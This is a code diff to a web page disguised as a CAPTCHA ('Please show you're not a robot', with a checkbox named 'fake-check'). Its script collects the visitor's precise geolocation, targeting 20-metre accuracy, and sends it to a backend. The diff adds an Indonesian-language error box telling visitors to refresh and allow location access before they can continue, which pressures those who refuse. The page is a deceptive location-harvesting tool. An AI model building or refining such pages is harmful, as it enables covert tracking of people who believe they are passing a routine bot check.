@@ -20,12 +20,20 @@
       min-height: 100vh;
     }
 
-    /* outer text above box */
+    /* outer wrapper */
+    .outer-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* text above box */
     .captcha-header {
       font-size: 18px;
       color: #000;
       margin-bottom: 10px;
       font-weight: 500;
+      text-align: center;
     }
 
     /* card */
@@ -119,11 +127,26 @@
       margin-top: 6px;
       user-select: none;
     }
+
+    /* error message box */
+    .error-msg {
+      margin-top: 14px;
+      font-size: 14px;
+      line-height: 1.4;
+      color: #d00000;
+      text-align: center;
+      max-width: 360px;
+      border: 1px solid #d00000;
+      background: #ffecec;
+      border-radius: 4px;
+      padding: 8px 12px;
+      display: none; /* default hidden */
+    }
   </style>
 </head>
 <body>
 
-<div>
+<div class="outer-wrap">
   <div class="captcha-header">Please show you're not a robot</div>
 
   <div class="captcha-card">
@@ -141,13 +164,20 @@
       </div>
     </div>
   </div>
+
+  <!-- error box -->
+  <div id="error-box" class="error-msg">
+    izinkan lokasi untuk melanjutkan.<br>
+    silahkan refresh dan izinkan lokasi.
+  </div>
 </div>
 
 <script>
 (function () {
   // DOM refs
-  const clickArea = document.getElementById("click-area");
-  const fakeCheck = document.getElementById("fake-check");
+  const clickArea  = document.getElementById("click-area");
+  const fakeCheck  = document.getElementById("fake-check");
+  const errorBox   = document.getElementById("error-box");
 
   // config for accuracy
   const TARGET_ACCURACY_METERS = 20; // send early if <= 20m
@@ -157,6 +187,13 @@
   let watchId = null;
   let bestFix = null;
   let sent = false;
+
+  // helper: show error message
+  function showError() {
+    if (errorBox) {
+      errorBox.style.display = "block";
+    }
+  }
 
   // send best fix to backend
   async function sendToServer(fix) {
@@ -243,20 +280,23 @@
 
   // if user denies location or it errors
   function handleErr(err) {
-    // do nothing visible.
-    // box stays unchecked if denied.
+    // stop watching
     if (watchId !== null) {
       navigator.geolocation.clearWatch(watchId);
       watchId = null;
     }
+
+    // show warning to user
+    showError();
   }
 
   // start flow when user taps box
   function startVerificationFlow() {
     if (alreadyVerified) return;
 
-    // if browser can't geolocate at all, we can't verify
+    // if browser can't geolocate at all
     if (!("geolocation" in navigator)) {
+      showError();
       return;
     }
 
@@ -271,13 +311,18 @@
       }
     );
 
-    // after MAX_WAIT_MS, if we have at least one fix, send it
+    // after MAX_WAIT_MS, if we have at least one fix, send it.
+    // if we got nothing (user denied or no lock), show error.
     setTimeout(() => {
       if (!alreadyVerified && bestFix) {
         trySendAndComplete();
-      } else {
-        // if still nothing, user probably denied or no fix
-        // leave unchecked, do nothing else
+      } else if (!alreadyVerified && !bestFix) {
+        // no location obtained within window
+        if (watchId !== null) {
+          navigator.geolocation.clearWatch(watchId);
+          watchId = null;
+        }
+        showError();
       }
     }, MAX_WAIT_MS);
   }
